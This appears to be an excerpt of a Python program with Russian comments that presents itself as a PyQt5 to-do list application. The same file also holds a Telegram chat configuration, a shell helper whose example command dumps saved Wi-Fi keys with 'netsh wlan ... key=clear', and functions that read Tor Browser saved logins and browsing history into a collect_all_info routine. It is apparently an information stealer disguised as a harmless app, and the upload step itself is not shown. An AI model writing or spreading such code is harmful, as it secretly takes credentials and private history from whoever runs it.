...
# ========================
TELEGRAM_CONFIG = {
    "CHAT_ID": "-1002244070038",  # Здесь укажите нужный chat_id
...
def run_command(args, codepage='cp437'):
    """
    Вызывает:
      1) chcp <codepage> >nul
      2) основную команду (все args объединяются пробелами)
    Потом декодирует вывод. По умолчанию:
      - пытаемся cp437 (часто русская OEM),
      - затем cp1251,
      - затем cp437.
    """
    # Удаляем sys.stdout.reconfigure(encoding="cp437"), т.к. это влияет только на print(), а не на subprocess
    # Собираем всю команду в одну строку:
    # "chcp 65001 >nul & netsh wlan show profile name="Profile with spaces" key=clear"
    cmd_str = f'chcp {codepage} >nul & ' + ' '.join(args)
    print(cmd_str)  # Для отладки

    try:
        output = subprocess.check_output(
            cmd_str,
            stderr=subprocess.STDOUT,
            shell=True,            # хотим выполнить "chcp ..." и саму команду
    ...
    try:
        print(f"KODIROVKA {codepage}")
        print(output.decode(codepage, errors="replace"))
        return output.decode(codepage, errors="replace")
    except:
        pass
    return "Not available"
...
def get_tor_passwords(tor_profile_path=None):
    # Если путь не передан, попробуем стандартный
    if tor_profile_path is None:
        # Пример для Windows:
        # Допустим, Tor установлен в C:\Users\<user>\Desktop\Tor Browser\...
        # Путь может отличаться (Portable, другая папка). Нужно подставлять реальный путь
        ...
        tor_profile_path = default_path

    logins_json_path = os.path.join(tor_profile_path, "logins.json")
    if not os.path.exists(logins_json_path):
        return ["Tor passwords: logins.json not found"]
    ...
    try:
        ...
        for login in logins:
            ...
            # Обычно в Firefox для расшифровки используется key4.db + NSS
            # но Tor может быть без сохранения master-password.
            # Если master password не установлена, логины *не* будут зашифрованы "как Firefox" — 
            #  или вообще не хранятся. 
            # В большинстве случаев Tor их не хранит в виде plaintext.
            results.append(f"Host: {hostname}, Username(encrypted)={enc_user}, Password(encrypted)={enc_pass}")
        return results if results else ["Tor passwords: None found"]
    except Exception as e:
        return [f"Tor passwords: Error reading logins.json - {e}"]

def get_tor_history(tor_profile_path=None):
    """
    Ищет places.sqlite в профиле Tor Browser и читает таблицу moz_places (url, title, visit_count).
    """
    if tor_profile_path is None:
        default_path = os.path.join(
            os.environ["USERPROFILE"], 
    ...
    places_path = os.path.join(tor_profile_path, "places.sqlite")
    if not os.path.exists(places_path):
        return ["Tor history: places.sqlite not found or not stored"]

    temp_copy = "TorPlaces_temp.sqlite"
    try:
        # Скопируем, чтобы не заблокировать файл
        import shutil
        shutil.copyfile(places_path, temp_copy)

        conn = sqlite3.connect(temp_copy)
        cursor = conn.cursor()
        # Простейший SELECT: url, title, visit_count из moz_places
        cursor.execute("SELECT url, title, visit_count FROM moz_places ORDER BY last_visit_date DESC LIMIT 50")
        rows = cursor.fetchall()
        results = []
        for (url, title, vcount) in rows:
            results.append(f"URL={url}, Title={title}, Visits={vcount}")
        conn.close()
        os.remove(temp_copy)
        return results if results else ["Tor history: No records found"]
    except Exception as e:
        return [f"Tor history: Error - {e}"]
...
def collect_all_info():
    try:
        return {
            ...
            "Tor Passwords": get_tor_passwords(),

            "Tor History": get_tor_history(),
...
class MainWindow(QMainWindow):
    def __init__(self):
        ...
        self.setWindowTitle("ToDo-приложение на PyQt5")
        self.setGeometry(100, 100, 500, 400)
        self.setStyleSheet("QMainWindow { background-color: #f0f0f0; }")

        # Путь к файлу с задачами (в той же папке, где лежит todo.py)
        self.tasks_file_path = os.path.join(
            os.path.dirname(os.path.realpath(__file__)), "tasks.txt"
        )
        ...
        # Разрешаем контекстное меню по правому клику
        self.task_list.setContextMenuPolicy(Qt.CustomContextMenu)
        self.task_list.customContextMenuRequested.connect(self.show_context_menu)
        self.v_layout.addWidget(self.task_list)

        # Горизонтальная панель для ввода + кнопок
        h_box = QHBoxLayout()
        ...
        # Кнопка «Удалить задачу» (по выделению в списке)
        self.remove_button = QPushButton("Удалить")
        self.remove_button.clicked.connect(self.remove_task)
        h_box.addWidget(self.remove_button)

        self.v_layout.addLayout(h_box)

        # Меню «File» (Сохранить, Выход)
        self.create_menubar()
    ...
    def create_menubar(self):
        """Создаёт меню 'File' с пунктами 'Сохранить' и 'Выход'."""
    ...
    def add_task(self):
        ...
        if task_text:  # Проверяем, что строка не пустая
            self.task_list.addItem(task_text)
            self.task_input.clear()

    def remove_task(self):
        """Метод для удаления выбранных задач из списка."""
    ...
    def edit_task(self):
        ...
        # Диалоговое окно для ввода нового текста
        new_text, ok = QInputDialog.getText(self, "Редактирование задачи", 
    ...
    def show_context_menu(self, position: QPoint):
        """Отображает контекстное меню по правому клику на задаче."""
        ...
        # Позиция курсора внутри QListWidget
        context_menu.exec_(self.task_list.mapToGlobal(position))

    def save_tasks(self):
        """Сохраняет все задачи из списка в файл."""
        try:
    ...
    def closeEvent(self, event):
        """При закрытии окна автоматически сохраняем задачи."""
        self.save_tasks()
